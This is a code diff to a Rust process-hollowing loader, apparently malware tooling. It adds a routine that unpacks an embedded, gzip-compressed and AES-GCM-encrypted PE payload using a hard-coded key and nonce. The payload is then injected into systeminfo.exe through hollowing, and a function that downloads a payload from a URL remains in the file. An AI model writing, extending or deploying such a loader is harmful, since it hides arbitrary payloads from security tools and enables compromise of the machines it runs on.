@@ -2,10 +2,9 @@ mod hollow;
 use hollow::*;
 use std::fs::File;
 use std::io::{Read};
-use std::process::{exit, Command, Stdio};
-use std::sync::mpsc::{channel, TryRecvError};
 use log::{debug, error, info, warn};
-use reqwest::Error;
+use flate2::read::GzDecoder;
+use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 
 #[cfg(debug_assertions)]
 fn init_logging() {
@@ -16,8 +15,9 @@ fn init_logging() {
 fn init_logging() {
     env_logger::builder().filter_level(log::LevelFilter::Info).init();
 }
-#[no_mangle]
-pub extern "C" fn main() {
+
+
+fn main() {
     //env_logger::init();
     init_logging();
     info!("Start process hollowing");
@@ -27,8 +27,9 @@ pub extern "C" fn main() {
 
 fn call_hollow_loader(){
     let mut buf: Vec<u8> = Vec::new();
-    buf = retrieve_local_pe();
-    //buf = retrieve_url_pe();
+    //buf = retrieve_local_pe();
+    // buf = retrieve_url_pe();
+    let mut buf = retrieve_embedded_pe();
     let pe_to_exec = "C:\\Windows\\System32\\systeminfo.exe";
     debug!("PE to be hollowed : {}",pe_to_exec);
     hollow64(&mut buf, pe_to_exec);
@@ -63,9 +64,9 @@ fn retrieve_url_pe() -> Vec<u8> {
     let response = ureq::get(url).call();
 
     if let Ok(response) = response {
-        if response.status() >= 200 && response.status() < 300 {
+        if response.status().is_success(){
             // Get a reader from the response
-            let mut reader = response.into_reader();
+            let mut reader = response.into_body().into_reader();
 
             // Create a buffer to store the bytes
             let mut buffer = Vec::new();
@@ -88,3 +89,29 @@ fn retrieve_url_pe() -> Vec<u8> {
     }
 }
 
+fn retrieve_embedded_pe() -> Vec<u8> {
+
+    let mut embedded_payload: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.packed"));
+    // 1. Decompress
+    let mut decoder = GzDecoder::new(embedded_payload);
+    let mut compressed_buffer = Vec::new();
+    if let Err(_) = decoder.read_to_end(&mut compressed_buffer) {
+        return Vec::new();
+    }
+
+    // 2. Decrypt
+    let key = Key::<Aes256Gcm>::from_slice(b"616e2d65787472656d656c792d736563");
+    let nonce = Nonce::from_slice(b"616e2d657874");
+    let cipher = Aes256Gcm::new(key);
+
+    match cipher.decrypt(nonce, compressed_buffer.as_ref()) {
+        Ok(decrypted_bytes) => {
+            info!("Payload decrypted and decompressed successfully.");
+            decrypted_bytes
+        }
+        Err(e) => {
+            error!("Decryption failed: {:?}", e);
+            Vec::new()
+        }
+    }
+}
